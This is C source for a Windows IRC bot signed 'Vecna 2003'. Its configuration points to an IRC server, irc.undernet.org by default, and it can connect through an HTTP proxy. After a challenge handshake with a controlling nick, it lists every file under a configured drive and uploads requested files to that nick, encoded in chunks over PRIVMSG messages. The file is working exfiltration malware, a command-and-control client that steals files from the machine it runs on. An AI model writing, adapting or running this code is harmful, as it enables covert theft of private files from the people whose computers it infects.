//(c) Vecna 2003

#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <miracl.h>

int _ip;
short _port;
short _proxyport;
char _nickname[MAX_PATH];
char _server[MAX_PATH];
char _proxy[MAX_PATH];
char _hostname[MAX_PATH];
char _porttxt[MAX_PATH];



SOCKET main_socket;
int PHASE=-1;
char _dirbase[MAX_PATH];



const char convert_table[0x40]={
	'A','B','C','D','E','F','G','H','I','J','K','L','M','N',
	'O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b',
	'c','d','e','f','g','h','i','j','k','l','m','n','o','p',
	'q','r','s','t','u','v','w','x','y','z','0','1','2','3',
	'4','5','6','7','8','9','@','_'
};



#define PACKET_SIZE 60



send_file_encoded(SOCKET output,char *nickname,char *filename,int resume){
	char buffer[MAX_PATH];
	char buffer2[MAX_PATH];
	char *input;
	char *data;
	char ch;
	char lastch;
	int count;
	int phase;
	int size;
	FILE* infile;

	if(infile=fopen(filename,"rb")){
		fseek(infile,0,SEEK_END);
		size=ftell(infile);
		rewind(infile);

		data=malloc(size+16);
		memset(data,0,size+16);
		fread(data,1,size,infile);
		fclose(infile);
	
		input=data;

		if(resume){
			size-=resume;
			input+=resume;
		}

		while(size){
			count=0;
			phase=0;
			memset(buffer2,0x0,MAX_PATH);
	
			while((size)&&(count<PACKET_SIZE)){
				ch=(char)*input++;
				size--;

				if(!phase){
					lastch=(ch&0xc0)>>6;
					buffer2[count++]=convert_table[ch&0x3f];
				}else if(phase==1){
					lastch|=(ch&0xc0)>>4;
					buffer2[count++]=convert_table[ch&0x3f];
				}else{
					lastch|=(ch&0xc0)>>2;
					buffer2[count++]=convert_table[ch&0x3f];
					buffer2[count++]=convert_table[lastch];
				}
				phase++;
				if(phase>2)phase=0;
			}

			if(phase==1){
				buffer2[count++]='!';
			}
			if(phase){
				buffer2[count++]='!';
				buffer2[count++]=convert_table[lastch];
			}

			strcpy(buffer,"PRIVMSG ");
			strcat(buffer,nickname);
			strcat(buffer," :");
			strcat(buffer,buffer2);
			strcat(buffer,"\n");
			send(output,buffer,strlen(buffer),0);

			Sleep(2000);
		}

		free(data);
	}
}

			 
			 
recursive_search(char *path,char *relpath){
	WIN32_FIND_DATA findata;
	char buffer[MAX_PATH];
	char temp[MAX_PATH];
	HANDLE fhnd;

	strcpy(buffer,path);
	strcat(buffer,"\\*.*");

	memset(&findata,0,sizeof(findata));

	if((int)(fhnd=FindFirstFile(buffer,&findata))!=-1){
		do {
			if(((char)findata.cFileName[0]!='.')&&(findata.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)){
				strcpy(buffer,path);
				strcat(buffer,"\\");
				strcat(buffer,findata.cFileName);

				strcpy(temp,relpath);
				strcat(temp,findata.cFileName);
				strcat(temp,"\\");

				recursive_search(buffer,temp);
			}else if(findata.nFileSizeLow){
				strcpy(buffer,"PRIVMSG ");
				strcat(buffer,_server);
				strcat(buffer," :");
				strcat(buffer,relpath);
				strcat(buffer,findata.cFileName);
				strcat(buffer," ");
				strcat(buffer,itoa((int)findata.nFileSizeLow,temp,10));
				strcat(buffer,"\n");
				send(main_socket,buffer,strlen(buffer),0);

				Sleep(100);
			}
		}while(FindNextFile(fhnd,&findata));
		FindClose(fhnd);
	}
}



int WINAPI scandirs(int arg){
	char buffer[MAX_PATH];

	recursive_search(_dirbase,"\\");
	strcpy(buffer,"PRIVMSG ");
	strcat(buffer,_server);
	strcat(buffer," :0 0\n");
	send(main_socket,buffer,strlen(buffer),0);

	return 0;
}


int WINAPI sendfile(char *input){
	char buffer[MAX_PATH];
	char buffer2[MAX_PATH];
	char who[MAX_PATH];
	int j;

	sscanf(input,"%s %s %s %s %s %s %s %s",&buffer,&buffer,&buffer,&who,&buffer,&buffer2);
																/* "Manda " filename  start */
	if(strcmp(who+1,"Feito!")==0)PHASE++; else {				
		j=atoi(buffer2);
		strcpy(buffer2,_dirbase);
		strcat(buffer2,buffer);
	    send_file_encoded(main_socket,_server,buffer2,j-1);
	}
	return 0;
}



process_line(char *input){
	char buffer[MAX_PATH];
	char buffer2[MAX_PATH];
	char who[MAX_PATH];
	big number1;
	big number2;
	int i;
	int j;

	printf(input);

	sscanf(input,"%s %s %s",&buffer,&buffer2,&who);
	
	if(strncmp(input,"PING",sizeof("PING")-1)==0){
		strcpy(buffer,"PONG ");
		strcat(buffer,(char *)&input[6]);
		send(main_socket,buffer,strlen(buffer),0);
		if(PHASE<=0)PHASE++;
	}else if(strcmp(buffer2,"PRIVMSG")==0){

		for(i=1,j=strlen(buffer);i<=j;i++){
			if(buffer[i]=='!'){
				who[i-1]=0;
				break;
			}else who[i-1]=buffer[i];
		}

		if(strcmp(who,_server)==0){		
			if(PHASE==2){
				sscanf(input,"%s %s %s %s %s %s %s %s",&buffer,&buffer,&buffer,&buffer,&buffer,&buffer2,&buffer,&who);
																			/*"Quanto" "eh"   numero1    *     numero2 */

				number1=mirvar(0);
				number2=mirvar(0);
				cinstr(number1,buffer2);
				cinstr(number2,who);
				multiply(number1,number2,number2);

				cotstr(number2,buffer2);
				strcpy(buffer,"PRIVMSG ");
				strcat(buffer,_server);
				strcat(buffer," :");
				strcat(buffer,buffer2);
				strcat(buffer,"\n");
				send(main_socket,buffer,strlen(buffer),0);

				PHASE++;
			}else if(PHASE==3){
				CreateThread(0,0,scandirs,0,0,&buffer);
				PHASE++;
			}else if(PHASE==4){
				CreateThread(0,0,sendfile,input,0,&buffer);
				Sleep(2000);
			}
		}
	}

	if(PHASE==1){
		strcpy(buffer,"PRIVMSG ");
		strcat(buffer,_server);
		strcat(buffer," :Oi!\n");
		send(main_socket,buffer,strlen(buffer),0);
		PHASE++;
	}

	if(PHASE==5){
		strcpy(buffer,"QUIT\n");
		send(main_socket,buffer,strlen(buffer),0);
	}
}



read_ini(){
	HOSTENT* i;
	char buffer[MAX_PATH];
	int j;
	int k;
    miracl *mip;

    mip=mirsys(512,2);
    mip->IOBASE=10;

	GetModuleFileNameA(NULL,buffer,MAX_PATH);

	k=(int)buffer;
	for(j=strlen(buffer); j; j--)
		if(buffer[j]=='.'){
			k+=j+1;
			break;
		}
	strcpy((char*)k,"INI");

	GetPrivateProfileStringA("Config","Port","6667",_porttxt,MAX_PATH,buffer);
	_port=atoi(_porttxt);

	GetPrivateProfileStringA("Config","Server","irc.undernet.org",_hostname,MAX_PATH,buffer);
	if((_ip=inet_addr(_hostname))==-1)
		if(i=gethostbyname(_hostname))
			_ip=*(int*)i->h_addr_list[0];

	GetPrivateProfileStringA("Config","Nick","ircbot-",_nickname,MAX_PATH,buffer);
	GetPrivateProfileStringA("Config","ServerNick","_server_",_server,MAX_PATH,buffer);
	GetPrivateProfileStringA("Config","Dir","C:",_dirbase,MAX_PATH,buffer);

	GetPrivateProfileStringA("Config","ProxyPort","80",_proxy,MAX_PATH,buffer);
	_proxyport=atoi(_proxy);
	GetPrivateProfileStringA("Config","Proxy","",_proxy,MAX_PATH,buffer);
}



int conecta(SOCKADDR_IN *my_addr){
	char buffer[MAX_PATH];
	char buffer2[MAX_PATH];
	HOSTENT* i;
	int j;

	if((char)_proxy[0]==0){
		return connect(main_socket,my_addr,sizeof(SOCKADDR_IN));
	}else {
		my_addr->sin_port=htons(_proxyport);
		if((my_addr->sin_addr.s_addr=inet_addr(_proxy))==-1)
			if(i=gethostbyname(_proxy))
				my_addr->sin_addr.s_addr=*(int*)i->h_addr_list[0];
		connect(main_socket,my_addr,sizeof(SOCKADDR_IN));

		strcpy(buffer,"Connect ");
		strcat(buffer,_hostname);
		strcat(buffer,":");
		strcat(buffer,_porttxt);
		strcat(buffer," HTTP/1.0\n\n");
		send(main_socket,buffer,strlen(buffer),0);

		recv(main_socket,buffer,MAX_PATH,0);
		sscanf(buffer,"%s %d",&buffer2,&j);
		if((j<200)||(j>299))return -1;
	}
	return 0;
}


int main(int argc, char* argv[]){
	WSADATA provider_info;
	SOCKADDR_IN my_addr;
	FD_SET readfds;
	char buffer[MAX_PATH*2];
	char *j;
	char *k;
	int i;
	int a;

	WSAStartup(1,&provider_info);

	read_ini();

	if((main_socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))!=-1){
		readfds.fd_count=1;
		readfds.fd_array[0]=main_socket;

		my_addr.sin_family=AF_INET;
		my_addr.sin_port=htons(_port);
		my_addr.sin_addr.s_addr=_ip;

		if(conecta(&my_addr)==0){
			strcpy(buffer,"NICK ");
			strcat(buffer,_nickname);
			strcat(buffer,"\nUSER ancev 8 * :t0bcri s´ancev\n");
			send(main_socket,buffer,strlen(buffer),0);

			while(select(1,&readfds,0,0,0)!=-1){

				j=malloc(MAX_PATH);
				k=j;
				a=0;

				while((i=recv(main_socket,k,MAX_PATH,0))==MAX_PATH){
					a+=MAX_PATH;
					j=realloc(j,a+MAX_PATH);
					k=j+a;
				}
				a+=i;

				if((!a)||(a==-1)){
					free(j);
					break;
				}

				j[a]=0;
				
				for(a=0,i=0;j[a]!=0;a++,i++){
					buffer[i]=j[a];
					if(j[a]=='\n'){
						buffer[i+1]=0;
						i=-1;
						process_line(buffer);
					}
				}

				free(j);
			}
		}

		closesocket(main_socket);
	}

    WSACleanup();
    return 0;
}
